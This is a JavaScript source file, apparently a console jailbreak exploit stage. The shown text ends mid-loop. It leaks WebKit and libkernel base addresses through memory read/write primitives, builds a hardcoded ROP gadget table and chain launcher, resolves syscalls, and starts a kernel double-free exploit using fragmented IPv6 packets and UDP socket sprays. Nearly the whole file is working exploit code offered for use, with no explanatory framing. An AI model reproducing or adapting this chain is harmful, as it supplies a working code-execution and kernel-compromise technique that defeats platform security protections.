var p;

function debug_bin(bin)
{
    $.ajax({
     url: '/debug/bin/',
     type: 'POST',
     contentType: 'application/octet-stream',
     data: bin,
     processData: false,
     async: false
  });
}
var get_jmptgt = function (addr) {
  var z = p.read4(addr) & 0xFFFF;
  var y = p.read4(addr.add32(2));
  if (z != 0x25ff) return 0;

  return addr.add32(y + 6);
}

var gadgetmap_wk = {
  "ep": [0x5b, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0x5d, 0xc3],
  "pop rsi": [0x5e, 0xc3],
  "pop rdi": [0x5f, 0xc3],
  "pop rsp": [0x5c, 0xc3],
  "pop rax": [0x58, 0xc3],
  "pop rdx": [0x5a, 0xc3],
  "pop rcx": [0x59, 0xc3],
  "pop rsp": [0x5c, 0xc3],
  "pop rbp": [0x5d, 0xc3],
  "pop r8": [0x47, 0x58, 0xc3],
  "pop r9": [0x47, 0x59, 0xc3],
  "infloop": [0xeb, 0xfe, 0xc3],
  "ret": [0xc3],
  "mov [rdi], rsi": [0x48, 0x89, 0x37, 0xc3],
  "mov [rax], rsi": [0x48, 0x89, 0x30, 0xc3],
  "mov [rdi], rax": [0x48, 0x89, 0x07, 0xc3],
  "mov rax, rdi": [0x48, 0x89, 0xf8, 0xc3]
};

var slowpath_jop = [0x48, 0x8B, 0x7F, 0x48, 0x48, 0x8B, 0x07, 0x48, 0x8B, 0x40, 0x30, 0xFF, 0xE0];
slowpath_jop.reverse();

var gadgets;
window.stage2 = function () {
  try {
    window.stage2_();
  } catch (e) {
    print(e);
  }
}

gadgetcache = {
  "ret":                    0x0000003C,
  "jmp rax":                0x00000082,
  "ep":                     0x000000AD,
  "pop rbp":                0x000000B6,
  "mov [rdi], rax":         0x003ADAEB,
  "pop r8":                 0x000179C5,
  "pop rax":                0x000043F5,
  "mov rax, rdi":           0x000058D0,
  "mov rax, [rax]":         0x0006C83A,
  "pop rsi":                0x0008F38A,
  "pop rdi":                0x00038DBA,
  "pop rcx":                0x00052E59,
  "pop rsp":                0x0001E687,
  "mov [rdi], rsi":         0x00023AC2,
  "mov [rax], rsi":         0x00256667,
  "pop rdx":                0x001BE024,
  "pop r9":                 0x00BB320F,
  "jop":                    0x000C37D0,
  "infloop":                0x01545EAA,

  "add rax, rcx":           0x000156DB,
  "add rax, rsi":           0x001520C6,
  "and rax, rsi":           0x01570B9F,
  "mov rdx, rax":           0x00353B31,
  "mov rdi, rax":           0x015A412F,
  "mov rax, rdx":           0x001CEF20,
  "jmp rdi":                0x00295E7E,

  // Used for kernel exploit stuff
  "mov rbp, rsp":           0x000F094A,
  "mov rax, [rdi]":         0x00046EF9,
  "add rdi, rax":           0x005557DF,
  "add rax, rsi":           0x001520C6,
  "and rax, rsi":           0x01570B9F,
  "jmp rdi":                0x00295E7E,
};

window.stage2_ = function () {
  p = window.prim;

  p.leakfunc = function (func) {
    var fptr_store = p.leakval(func);
    return (p.read8(fptr_store.add32(0x18))).add32(0x40);
  }

  var parseFloatStore = p.leakfunc(parseFloat);
  var parseFloatPtr = p.read8(parseFloatStore);
  var webKitBase = p.read8(parseFloatStore);
  window.webKitBase = webKitBase;

  webKitBase.low &= 0xfffff000;
  webKitBase.sub32inplace(0x59c000 - 0x24000);

  var o2wk = function (o) {
    return webKitBase.add32(o);
  }

  gadgets = {
    "stack_chk_fail": o2wk(0xc8),
    "memset": o2wk(0x228),
    "setjmp": o2wk(0x14f8)
  };

  var libSceLibcInternalBase = p.read8(get_jmptgt(gadgets.memset));
  libSceLibcInternalBase.low &= 0xfffff000;
  libSceLibcInternalBase.sub32inplace(0x20000);

  var libKernelBase = p.read8(get_jmptgt(gadgets.stack_chk_fail));
  window.libKernelBase = libKernelBase;
  libKernelBase.low &= 0xfffff000;
  libKernelBase.sub32inplace(0xd000 + 0x4000);

  var o2lk = function (o) {
    return libKernelBase.add32(o);
  }

  window.o2lk = o2lk;

  var wkview = new Uint8Array(0x1000);
  var wkstr = p.leakval(wkview).add32(0x10);
  var orig_wkview_buf = p.read8(wkstr);

  p.write8(wkstr, webKitBase);
  p.write4(wkstr.add32(8), 0x367c000);

  var gadgets_to_find = 0;
  var gadgetnames = [];
  for (var gadgetname in gadgetmap_wk) {
    if (gadgetmap_wk.hasOwnProperty(gadgetname)) {
      gadgets_to_find++;
      gadgetnames.push(gadgetname);
      gadgetmap_wk[gadgetname].reverse();
    }
  }

  gadgets_to_find++;

  var findgadget = function (donecb) {
    if (gadgetcache) {
      gadgets_to_find = 0;
      slowpath_jop = 0;

      for (var gadgetname in gadgetcache) {
        if (gadgetcache.hasOwnProperty(gadgetname)) {
          gadgets[gadgetname] = o2wk(gadgetcache[gadgetname]);
        }
      }
    } else {
      for (var i = 0; i < wkview.length; i++) {
        if (wkview[i] == 0xc3) {
          for (var nl = 0; nl < gadgetnames.length; nl++) {
            var found = 1;
            if (!gadgetnames[nl]) continue;
            var gadgetbytes = gadgetmap_wk[gadgetnames[nl]];
            for (var compareidx = 0; compareidx < gadgetbytes.length; compareidx++) {
              if (gadgetbytes[compareidx] != wkview[i - compareidx]) {
                found = 0;
                break;
              }
            }
            if (!found) continue;
            gadgets[gadgetnames[nl]] = o2wk(i - gadgetbytes.length + 1);
            gadgetoffs[gadgetnames[nl]] = i - gadgetbytes.length + 1;
            delete gadgetnames[nl];
            gadgets_to_find--;
          }
        } else if (wkview[i] == 0xe0 && wkview[i - 1] == 0xff && slowpath_jop) {
          var found = 1;
          for (var compareidx = 0; compareidx < slowpath_jop.length; compareidx++) {
            if (slowpath_jop[compareidx] != wkview[i - compareidx]) {
              found = 0;
              break;
            }
          }
          if (!found) continue;
          gadgets["jop"] = o2wk(i - slowpath_jop.length + 1);
          gadgetoffs["jop"] = i - slowpath_jop.length + 1;
          gadgets_to_find--;
          slowpath_jop = 0;
        }

        if (!gadgets_to_find) break;
      }
    }
    if (!gadgets_to_find && !slowpath_jop) {
      setTimeout(donecb, 50);
    } else {
      print("missing gadgets: ");
      for (var nl in gadgetnames) {
        print(" - " + gadgetnames[nl]);
      }
      if (slowpath_jop) print(" - jop gadget");
    }
  }

  findgadget(function () { });
  var hold1;
  var hold2;
  var holdz;
  var holdz1;

  while (1) {
    hold1 = { a: 0, b: 0, c: 0, d: 0 };
    hold2 = { a: 0, b: 0, c: 0, d: 0 };
    holdz1 = p.leakval(hold2);
    holdz = p.leakval(hold1);
    if (holdz.low - 0x30 == holdz1.low) break;
  }

  var pushframe = [];
  pushframe.length = 0x80;
  var funcbuf;
  var funcbuf32 = new Uint32Array(0x100);
  nogc.push(funcbuf32);

  var launch_chain = function (chain) {
    var stackPointer = 0;
    var stackCookie = 0;
    var orig_reenter_rip = 0;

    var reenter_help = {
      length: {
        valueOf: function () {
          orig_reenter_rip = p.read8(stackPointer);
          stackCookie = p.read8(stackPointer.add32(8));
          var returnToFrame = stackPointer;

          var ocnt = chain.count;
          chain.push_write8(stackPointer, orig_reenter_rip);
          chain.push_write8(stackPointer.add32(8), stackCookie);

          if (chain.runtime) returnToFrame = chain.runtime(stackPointer);

          chain.push(gadgets["pop rsp"]);
          chain.push(returnToFrame); // -> back to the trap life
          chain.count = ocnt;

          p.write8(stackPointer, (gadgets["pop rsp"])); // pop pop
          p.write8(stackPointer.add32(8), chain.stackBase); // rop rop
        }
      }
    };
    
    funcbuf = p.read8(p.leakval(funcbuf32).add32(0x10));

    p.write8(funcbuf.add32(0x30), gadgets["setjmp"]);
    p.write8(funcbuf.add32(0x80), gadgets["jop"]);
    p.write8(funcbuf, funcbuf);
    p.write8(parseFloatStore, gadgets["jop"]);
    var orig_hold = p.read8(holdz1);
    var orig_hold48 = p.read8(holdz1.add32(0x48));

    p.write8(holdz1, funcbuf.add32(0x50));
    p.write8(holdz1.add32(0x48), funcbuf);
    parseFloat(hold2, hold2, hold2, hold2, hold2, hold2);
    p.write8(holdz1, orig_hold);
    p.write8(holdz1.add32(0x48), orig_hold48);

    stackPointer = p.read8(funcbuf.add32(0x10));
    rtv = Array.prototype.splice.apply(reenter_help);
    return p.leakval(rtv);
  }

  gadgets = gadgets;
  p.loadchain = launch_chain;

  function swapkeyval(json) {
    var ret = {};
    for (var key in json) {
      if (json.hasOwnProperty(key)) {
        ret[json[key]] = key;
      }
    }
    return ret;
  }

  var kview = new Uint8Array(0x1000);
  var kstr = p.leakval(kview).add32(0x10);
  var orig_kview_buf = p.read8(kstr);

  p.write8(kstr, window.libKernelBase);
  p.write4(kstr.add32(8), 0x40000);

  var countbytes;
  for (var i = 0; i < 0x40000; i++) {
    if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
      countbytes = i;
      break;
    }
  }
  p.write4(kstr.add32(8), countbytes + 32);

  var dview32 = new Uint32Array(1);
  var dview8 = new Uint8Array(dview32.buffer);
  for (var i = 0; i < countbytes; i++) {
    if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
      dview8[0] = kview[i + 3];
      dview8[1] = kview[i + 4];
      dview8[2] = kview[i + 5];
      dview8[3] = kview[i + 6];
      var syscallno = dview32[0];
      window.syscalls[syscallno] = window.libKernelBase.add32(i);
    }
  }

  window.chain = new window.rop;
  var returnvalue;

  p.fcall_ = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
    chain.clear();

    chain.notimes = this.next_notime;
    this.next_notime = 1;

    chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);

    chain.push(window.gadgets["pop rdi"]);
    chain.push(chain.stackBase.add32(0x3ff8));
    chain.push(window.gadgets["mov [rdi], rax"]);

    chain.push(window.gadgets["pop rax"]);
    chain.push(p.leakval(0x41414242));

    if (chain.run().low != 0x41414242) throw new Error("unexpected rop behaviour");
    returnvalue = p.read8(chain.stackBase.add32(0x3ff8));
  }

  p.fcall = function () {
    var rv = p.fcall_.apply(this, arguments);
    return returnvalue;
  }

  p.readstr = function (addr) {
    var addr_ = addr.add32(0);
    var rd = p.read4(addr_);
    var buf = "";
    while (rd & 0xFF) {
      buf += String.fromCharCode(rd & 0xFF);
      addr_.add32inplace(1);
      rd = p.read4(addr_);
    }
    return buf;
  }

  p.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
    if (typeof sysc == "string") {
      sysc = window.syscallnames[sysc];
    }
    if (typeof sysc != "number") {
      throw new Error("invalid syscall");
    }

    var off = window.syscalls[sysc];
    if (off == undefined) {
      throw new Error("invalid syscall");
    }

    return p.fcall(off, rdi, rsi, rdx, rcx, r8, r9);
  }

  p.stringify = function (str) {
    var bufView = new Uint8Array(str.length + 1);
    for (var i = 0; i < str.length; i++) {
      bufView[i] = str.charCodeAt(i) & 0xFF;
    }
    window.nogc.push(bufView);
    return p.read8(p.leakval(bufView).add32(0x10));
  };

  p.malloc = function malloc(sz) {
    var backing = new Uint8Array(0x10000 + sz);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = backing;
    return ptr;
  }

  p.malloc32 = function malloc32(sz) {
    var backing = new Uint8Array(0x10000 + sz * 4);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = new Uint32Array(backing.buffer);
    return ptr;
  }

  // Added primitives
  p.read2 = function read2(addr) {
    return p.read4(addr) & 0xFFFF;
  }

  p.read1 = function read1(addr) {
    return p.read4(addr) & 0xFF;
  }

  p.write2 = function write2(addr, val) {
    var origData = p.read4(addr) & 0xFFFF0000;
    var newData = origData | (val & 0xFFFF);
    p.write4(addr, newData);
  }

  p.write1 = function write1(addr, val) {
    var origData = p.read4(addr) & 0xFFFFFF00;
    var newData = origData | (val & 0xFF);
    p.write4(addr, newData);
  }

  var errnoAddr = libKernelBase.add32(0x84BF0);
  p.write8(errnoAddr, 0);

  // Spawn thread
  var spawnthread = function (name, chain) {
    var longjmp = window.webKitBase.add32(0x14e8);
    var createThread = window.webKitBase.add32(0x779390);
    var contextp = p.malloc32(0x2000);
    var contextz = contextp.backing;
    contextz[0] = 1337;
    var thread2 = new rop();
    thread2.push(window.gadgets["ret"]);
    thread2.push(window.gadgets["ret"]);
    thread2.push(window.gadgets["ret"]);
    thread2.push(window.gadgets["ret"]);
    chain(thread2);
    p.write8(contextp, window.gadgets["ret"]);
    p.write8(contextp.add32(0x10), thread2.stackBase);
    p.syscall(324, 1);
    var retv = function () { p.fcall(createThread, longjmp, contextp, p.stringify(name)); }
    window.nogc.push(contextp);
    window.nogc.push(thread2);
    return retv;
  }

  p.dumpBytes = function dumpBytes(addr, len) {
    var dumpStr = "Dump: ";

    for(var i = 0; i < len; i++)
      dumpStr += "0x" + p.read1(addr.add32(i)).toString(16) + " ";

    debug_log(dumpStr);
  }

  try {
    var usleep = libKernelBase.add32(0xCC30);

    var offsetToWebKit = function (o) {
      return window.webKitBase.add32(o);
    }

    //p.fcall(usleep, 20000);
    //alert("usleep called");
    //return;

    var debugString = p.malloc(0x1000);

    var debug_log = function(str)
    {
      for (var i = 0; i < str.length; i++) {
        debugString.backing[i] = str.charCodeAt(i) & 0xFF;
      }

      debugString.backing[str.length] = 0x0D;
      debugString.backing[str.length + 1] = 0x0A;
      debugString.backing[str.length + 2] = 0x00;

      p.syscall("sys_mdbg_service", 0x7, debugString, 0);
    }

    // If we don't already have a jailbreak, load the other page first
    // var testIfJailbroken = p.syscall(23, 0);
    // debug_log("Jailbreak test: " + testIfJailbroken);

    // if (testIfJailbroken != "0") {
    //   debug_log("Redirect to working exploit...");
    //   debug_log("================================");

    //   window.location.href = "index-bpf.html";
    //   return;
    // }
    
    // debug_log("We're jailbroken, continuing...");

    alert("Run? spec");

    var AF_INET6   = 28;
    var SOCK_RAW   = 3;
    var SOCK_DGRAM = 2;

    var IPPROTO_HOPOPTS   = 0;
    var IPPROTO_IPV6      = 41;
    var IPPROTO_ROUTING   = 43;
    var IPPROTO_FRAGMENT  = 44;
    var IPPROTO_ICMPV6    = 58;
    var IPPROTO_DSTOPTS   = 60;
    var IPPROTO_RAW       = 255;

    var IP6OPT_PADN       = 1;
    var IP6F_MORE_FRAG    = 0x100;

    var HBH   = 0x00;                         // 0x00
    var HBH_IP6H_NXT = HBH + 0x00;              // 0x00
    var HBH_IP6H_LEN = HBH + 0x01;              // 0x01

    var HBH_OPT = HBH_IP6H_LEN + 1;           // 0x02
    var HBH_OPT_IP6O_TYPE = HBH_OPT + 0x00;     // 0x02
    var HBH_OPT_IP6O_LEN  = HBH_OPT + 0x01;     // 0x03

    var HBH_PAD = HBH_OPT_IP6O_LEN + 1;       // 0x04

    var FRAG = HBH_PAD + 4;                   // 0x08
    var FRAG_IP6F_NXT  = FRAG + 0x00;           // 0x08
    var FRAG_IP6F_RESERVED = FRAG + 0x01;       // 0x09
    var FRAG_IP6F_OFFLG = FRAG + 0x02;          // 0x0A
    var FRAG_IP6F_IDENT = FRAG + 0x04;          // 0x0C

    var DEST = FRAG_IP6F_IDENT + 4;           // 0x10
    var DEST_IP6D_NXT = DEST + 0x00;            // 0x10
    var DEST_IP6D_LEN = DEST + 0x01;            // 0x01

    var DEST_OPT1 = DEST_IP6D_LEN + 1;        // 0x12
    var DEST_OPT1_IP6O_TYPE = DEST_OPT1 + 0x00; // 0x12
    var DEST_OPT1_IP6O_LEN = DEST_OPT1 + 0x01;  // 0x13

    var DEST_OPT2 = FRAG_IP6F_IDENT + 4;      // 0x10
    var DEST_OPT2_IP6O_TYPE = DEST_OPT2 + 0x00; // 0x10
    var DEST_OPT2_IP6O_LEN = DEST_OPT2 + 0x01;  // 0x11

    var PACKET1_DATA = DEST_OPT1_IP6O_LEN + 1;  // 0x14
    var PACKET2_DATA = DEST_OPT2_IP6O_LEN + 1;  // 0x12

    ///////////////////////////////////////////////////////////////////////////////////////////////
    // Stage 1 - Create exploit "sock" socket
    ///////////////////////////////////////////////////////////////////////////////////////////////

    // Create exploit socket
    var sock = p.syscall(window.syscallnames["sys_socket"], AF_INET6, SOCK_RAW, IPPROTO_HOPOPTS);
    debug_log("sock = " + sock.toString(16));

    // Setup address
    //
    // struct sockaddr_in6 {
    //   uint8_t         sin6_len;          // 0x00 (size: 0x01)
    //   sa_family_t     sin6_family;       // 0x01 (size: 0x01)
    //   in_port_t       sin6_port;         // 0x02 (size: 0x02)
    //   uint32_t        sin6_flowinfo;     // 0x04 (size: 0x04)
    //   struct in6_addr sin6_addr;         // 0x08 (size: 0x10)
    //   uint32_t        sin6_scope_id;     // 0x18 (size: 0x04)
    // };                                   // size: 0x1C
    var addr = p.malloc(0x1C);
    p.write1(addr.add32(0x01), AF_INET6);   // sockaddr_in6->sin6_family
    p.write2(addr.add32(0x02), 0);          // sockaddr_in6->sin6_port

    // 0x1B510 = inet_pton
    p.fcall(window.libKernelBase.add32(0x1B510), AF_INET6, p.stringify("::1"), addr.add32(0x08)); // sockaddr_in6->sin6_addr

    ///////////////////////////////////////////////////////////////////////////////////////////////
    // Stage 2 - Setup double free fragmented packet
    ///////////////////////////////////////////////////////////////////////////////////////////////

    var fragmentPacketSprayAddr = p.malloc(0x20);

    var packetOne = p.malloc(0x48);
    var packetTwo = p.malloc(0x60);

    // fragmentPacket takes a nextHeaderType, identifier, size to split at, packet data, and outPacketOne/outPacketTwo pointers,
    // and writes the fragmented packets with the proper header information into the output packet buffers. nextHeaderType should
    // be IPPROTO_ICMPV6 or IPPROTO_IPV6.
    p.fragmentPacket = function fragmentPacket(nextHeaderType, id, splitSize, packetData, outPacketOne, outPacketTwo)
    {
      // First packet header
      p.write1(outPacketOne.add32(HBH_IP6H_NXT), IPPROTO_FRAGMENT);
      p.write1(outPacketOne.add32(HBH_IP6H_LEN), 0);
      p.write1(outPacketOne.add32(HBH_OPT_IP6O_TYPE), IP6OPT_PADN);
      p.write1(outPacketOne.add32(HBH_OPT_IP6O_LEN), 4);
      p.write1(outPacketOne.add32(FRAG_IP6F_NXT), IPPROTO_DSTOPTS);
      p.write1(outPacketOne.add32(FRAG_IP6F_RESERVED), 0);
      p.write2(outPacketOne.add32(FRAG_IP6F_OFFLG), IP6F_MORE_FRAG);
      p.write4(outPacketOne.add32(FRAG_IP6F_IDENT), id);
      p.write1(outPacketOne.add32(DEST_IP6D_NXT), nextHeaderType);
      p.write1(outPacketOne.add32(DEST_IP6D_LEN), 1);
      p.write1(outPacketOne.add32(DEST_OPT1_IP6O_TYPE), IP6OPT_PADN);
      p.write1(outPacketOne.add32(DEST_OPT1_IP6O_LEN), splitSize);

      // First packet data
      for(var i = 0; i < splitSize; i++)
        p.write1(outPacketOne.add32(PACKET1_DATA + i), packetData[i]);

      // Second packet header
      p.write1(outPacketTwo.add32(HBH_IP6H_NXT), IPPROTO_FRAGMENT);
      p.write1(outPacketTwo.add32(HBH_IP6H_LEN), 0);
      p.write1(outPacketTwo.add32(HBH_OPT_IP6O_TYPE), IP6OPT_PADN);
      p.write1(outPacketTwo.add32(HBH_OPT_IP6O_LEN), 4);
      p.write1(outPacketTwo.add32(FRAG_IP6F_NXT), IPPROTO_DSTOPTS);
      p.write1(outPacketTwo.add32(FRAG_IP6F_RESERVED), 0);
      p.write2(outPacketTwo.add32(FRAG_IP6F_OFFLG), 0x800);
      p.write4(outPacketTwo.add32(FRAG_IP6F_IDENT), id);
      p.write1(outPacketTwo.add32(DEST_OPT2_IP6O_TYPE), IP6OPT_PADN);
      p.write1(outPacketTwo.add32(DEST_OPT2_IP6O_LEN), packetData.length - splitSize);

      // Second packet data
      for(var i = 0; i < (packetData.length - splitSize); i++)
        p.write1(outPacketTwo.add32(PACKET2_DATA + i), packetData[i + splitSize]);
    }

    p.write1(fragmentPacketSprayAddr.add32(1), AF_INET6);
    p.fcall(window.libKernelBase.add32(0x1B510), AF_INET6, p.stringify("::1"), fragmentPacketSprayAddr.add32(0x08)); // sockaddr_in6->sin6_addr

    p.write2(fragmentPacketSprayAddr.add32(2), 0xbeef);

    debug_log("dumping addr: ");
    p.dumpBytes(fragmentPacketSprayAddr, 0x1C);

    var packetFragmentedDataCache = p.malloc(0x200);
    var packetSendDataCache = p.malloc(0x200);
    var packetRecvDataCache = p.malloc(0x400);

    p.sendPacket = function(dataQword, sz)
    {
      p.write4(packetSendDataCache, dataQword);
      var testRv = p.syscall("sys_sendto", spraySocketUDP, packetSendDataCache, sz, 0, 0, 0);
    }

    p.sendPacketBuf = function(buf, sz)
    {
      var testRv = p.syscall("sys_sendto", spraySocketUDP, buf, sz, 0, 0, 0);
    }

    p.recvPacket = function(sz)
    {
      var testRv = p.syscall("sys_read", spraySocketUDP, packetRecvDataCache, sz);
      debug_log("recv packet = " + testRv.toString(16));
      return p.read4(packetRecvDataCache);
    }

    p.sendFragmentedPacket = function(id, splitOffset, data, hasMoreFragments)
    {
      splitOffset += hasMoreFragments;

      p.write1(packetFragmentedDataCache.add32(HBH_IP6H_NXT), IPPROTO_FRAGMENT);
      p.write1(packetFragmentedDataCache.add32(HBH_IP6H_LEN), 0);
      p.write1(packetFragmentedDataCache.add32(HBH_OPT_IP6O_TYPE), IP6OPT_PADN);
      p.write1(packetFragmentedDataCache.add32(HBH_OPT_IP6O_LEN), 4);
      p.write1(packetFragmentedDataCache.add32(FRAG_IP6F_NXT), IPPROTO_ROUTING);
      p.write1(packetFragmentedDataCache.add32(FRAG_IP6F_RESERVED), 0);
      p.write1(packetFragmentedDataCache.add32(FRAG_IP6F_OFFLG), splitOffset / 0x100);
      p.write1(packetFragmentedDataCache.add32(FRAG_IP6F_OFFLG + 1), splitOffset % 0x100);
      p.write4(packetFragmentedDataCache.add32(FRAG_IP6F_IDENT), id);

      for(var i = 0; i < data.length; i += 1)
      {
        p.write1(packetFragmentedDataCache.add32(0x10 + i), data[i]);
      }

      p.syscall("sys_sendto", spraySocketRaw, packetFragmentedDataCache, 16 + data.length, 0, fragmentPacketSprayAddr, 0x1C);
    }

    p.sendFragmentedPacket_poc = function(id, data, splitOffset, sz, hasMoreFragments)
    {
      p.write1(packetFragmentedDataCache.add32(HBH_IP6H_NXT), IPPROTO_FRAGMENT);
      p.write1(packetFragmentedDataCache.add32(HBH_IP6H_LEN), 0);
      p.write1(packetFragmentedDataCache.add32(HBH_OPT_IP6O_TYPE), IP6OPT_PADN);
      p.write1(packetFragmentedDataCache.add32(HBH_OPT_IP6O_LEN), 4);
      
      p.write4(packetFragmentedDataCache.add32(4), 0x41414141);      

      p.write1(packetFragmentedDataCache.add32(FRAG_IP6F_NXT), IPPROTO_ROUTING);
      p.write1(packetFragmentedDataCache.add32(FRAG_IP6F_RESERVED), 0);
      p.write1(packetFragmentedDataCache.add32(FRAG_IP6F_OFFLG), (splitOffset + hasMoreFragments) / 0x100);
      p.write1(packetFragmentedDataCache.add32(FRAG_IP6F_OFFLG + 1), (splitOffset + hasMoreFragments) % 0x100);
      p.write4(packetFragmentedDataCache.add32(FRAG_IP6F_IDENT), id);

      for(var i = 0; i < sz; i += 1)
      {
        p.write1(packetFragmentedDataCache.add32(0x10 + i), p.read1(data.add32(splitOffset + i)));
      }

      debug_log("------")
      debug_log("dumping fragmented packet");
      p.dumpBytes(packetFragmentedDataCache, 16 + sz);

      p.syscall("sys_sendto", spraySocketRaw, packetFragmentedDataCache, 16 + data.length, 0, fragmentPacketSprayAddr, 0x1C);
    }

    p.getport = function(fd)
    {
      var outAddr = p.malloc(0x20);
      var outAddrSz = p.malloc(0x8);

      p.write8(outAddrSz, 0x1C);

      var getSockname = p.syscall("sys_getsockname", fd, outAddr, outAddrSz);
      debug_log("getsockname: " + getSockname.toString(16));

      p.dumpBytes(outAddr, 0x1C);

      return p.read2(outAddr.add32(2));
    }

    p.portToChecksum = function(port)
    {
      var basePort = 0x0de6;
      var baseCsum = 0x36b1;
      var csum = baseCsum - 2 * (port - basePort);
      csum += 0x1fffe;
      csum %= 0xffff;
      return csum;
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////
    // Stage 3 - Setup a spray loopback socket
    ///////////////////////////////////////////////////////////////////////////////////////////////

    var AF_UNIX = 1;
    var SOCK_STREAM = 1;
    var MSG_PEEK     = 2;
    var MSG_DONTWAIT = 0x80;

    var ADDR_LEN = 0x1C;
    var PACKET_ONE_LEN = 0x18;
    var PACKET_TWO_LEN = 0x28;

    // Setup a loopback address
    //
    // struct sockaddr_in6 {
    //          uint8_t         sin6_len;       /* length of this struct */
    //          sa_family_t     sin6_family;    /* AF_INET6 */
    //          in_port_t       sin6_port;      /* Transport layer port # */
    //          uint32_t        sin6_flowinfo;  /* IP6 flow information */
    //          struct in6_addr sin6_addr;      /* IP6 address */
    //          uint32_t        sin6_scope_id;  /* scope zone index */
    //  };
    var spraySocketAddrSz = p.malloc(0x8);
    p.write8(spraySocketAddrSz, 0x1C);

    var spraySocketAddr = p.malloc(0x1C);

    for(var i = 0; i < 0x1C; i += 4)
      p.write4(spraySocketAddr.add32(i), 0);

    p.write1(spraySocketAddr.add32(0x01), AF_INET6);
    p.write1(spraySocketAddr.add32(0x17), 0x01);

    // Create the loopback spray socket
    var spraySocketUDP = [];
    var colletTrashSocket = 0;

    p.write8(spraySocketAddrSz, 0x1C);

    p.getUDPSocket = function(){
      var fd = -1;
      fd = p.syscall("sys_socket", AF_INET6, SOCK_DGRAM);

      // Bind address
      for(var j = 0; j < 0x1C; j += 4)
        p.write4(spraySocketAddr.add32(j), 0);

      p.write1(spraySocketAddr.add32(0x01), AF_INET6);
      p.write1(spraySocketAddr.add32(0x17), 0x01);

      // Bind and connect
      p.syscall("sys_bind", fd, spraySocketAddr, 0x1C);
      p.syscall("sys_getsockname", fd, spraySocketAddr, spraySocketAddrSz);
      return fd;
    }

    var increaseSockBufStaticBuffer = p.malloc(0x4);
    p.increaseSockBuf = function (fd) {
      p.write4(increaseSockBufStaticBuffer, 0x100000);
      var testRv = p.syscall("sys_setsockopt", fd, SOL_SOCKET, SO_RCVBUF, increaseSockBufStaticBuffer, 4);
    }

    for(var i = 0; i < 64; i++)
    {
      spraySocketUDP[i] = p.getUDPSocket();
      debug_log("udp sock i = " + i + " | fd = " + spraySocketUDP[i]);
      // connect ???
      p.syscall("sys_connect", spraySocketUDP[i], spraySocketAddr, 0x1C);
    }

    colletTrashSocket = p.getUDPSocket()

    var spraySocketRaw = p.syscall("sys_socket", AF_INET6, SOCK_RAW, IPPROTO_HOPOPTS);
    debug_log("spray raw socket = " + spraySocketRaw.toString(16));

    // Setup caches for reading and spraying
    var readBuf = p.malloc(0x10);
    var testData = p.malloc(0x10);
    
    ///////////////////////////////////////////////////////////////////////////////////////////////
    // Stage 4 - Exploitation stuff                                                              //
    ///////////////////////////////////////////////////////////////////////////////////////////////

    var sprayDataSize = 8;
    var sprayDataBuf1 = p.malloc(0x500);
    var sprayDataBuf2 = p.malloc(sprayDataSize);
    p.write8(sprayDataBuf2.add32(0), 0x41414141);

    // Setup double free packet
    var packetData = [];

    for(var i = 0; i < 10; i++)
      packetData[i] = 0x40 + i;
    
    p.fragmentPacket(IPPROTO_ROUTING, 0x5050, 4, packetData, packetOne, packetTwo);

    var largePacket = p.malloc(0x400);
    
    for (var i=0; i<0x400; i+=4){
      p.write4(largePacket.add32(i),0xffffffff);
    }

    for(var i = 0; i < 10; i++)
      p.sendFragmentedPacket(0x1337 + i, 16, [0x61, 0x61, 0x61, 0x61], 0);

    var SOL_SOCKET = 0xffff;
    var SO_RCVBUF = 0x1002;

    p.increaseSockBuf = function (fd) {
        var n = p.malloc(0x4);
        p.write4(n, 0x100000);

        var testRv = p.syscall("sys_setsockopt", fd, SOL_SOCKET, SO_RCVBUF, n, 4);
        // debug_log("sys_setsockopt = " + testRv.toString(16));
        // debug_log("errno = " + p.read8(errnoAddr).toString(16));
    }

    //p.increaseSockBuf(spraySocketUDP);

    /*
      Yes we reset Stage numbering back to 0 (we where at 5). Don't as why!!!
    */

    var tcpSockPairs = [];
  
    var tcpSockPairsCur = p.malloc(4*2); // sizeof(int) socketpair

    /*
      int socketpair(int domain, int type, int protocol, int *rsv); }
    */
    for(var i = 0; i < 64; i++)
    {
      //socketpair(AF_UNIX, SOCK_STREAM, 0, tcpSockPair)
      p.write8(errnoAddr, 0);
      var socketpairRv = p.syscall("sys_socketpair", AF_UNIX, SOCK_STREAM, 0, tcpSockPairsCur);

      var sockpairOne = p.read4(tcpSockPairsCur.add32(0));
      var sockpairTwo = p.read4(tcpSockPairsCur.add32(4));
      tcpSockPairs.push([sockpairOne,sockpairTwo]);
    }
    
    /////////////////////////////////////////////////////////////////////
    // Stage 0 - trigger double free                                   //
    /////////////////////////////////////////////////////////////////////
    debug_log("triggering uaf...");

    var tag_packet = p.malloc(0xC4);

    var rv1 = p.syscall(window.syscallnames["sys_sendto"],
      sock,           // fd
      packetOne,      // buf
      PACKET_ONE_LEN, // len
      0,              // flags
      addr,           // dest_addr
      ADDR_LEN        // addrlen
    );

    var rv2 = p.syscall(window.syscallnames["sys_sendto"],
      sock,           // fd
      packetTwo,      // buf
      PACKET_TWO_LEN, // len
      0,              // flags
      addr,           // dest_addr
      ADDR_LEN        // addrlen
    );

    /////////////////////////////////////////////////////////////////////
    // Stage 1 - overlap two udp socks                                 //
    /////////////////////////////////////////////////////////////////////

    debug_log("spraying...");

    var rv = 0;
    var tag_packet = p.malloc(0xC4);

    for(var i = 0; i < 64; i++) //0x40
    {
      p.write4(tag_packet, i);
      rv = p.syscall("sys_sendto", spraySocketUDP[i], tag_packet, 0xC4, 0, 0, 0);
    }

    p.fcall(usleep, 1000000);

    for(var i = 0; i < 64; i++)
    {
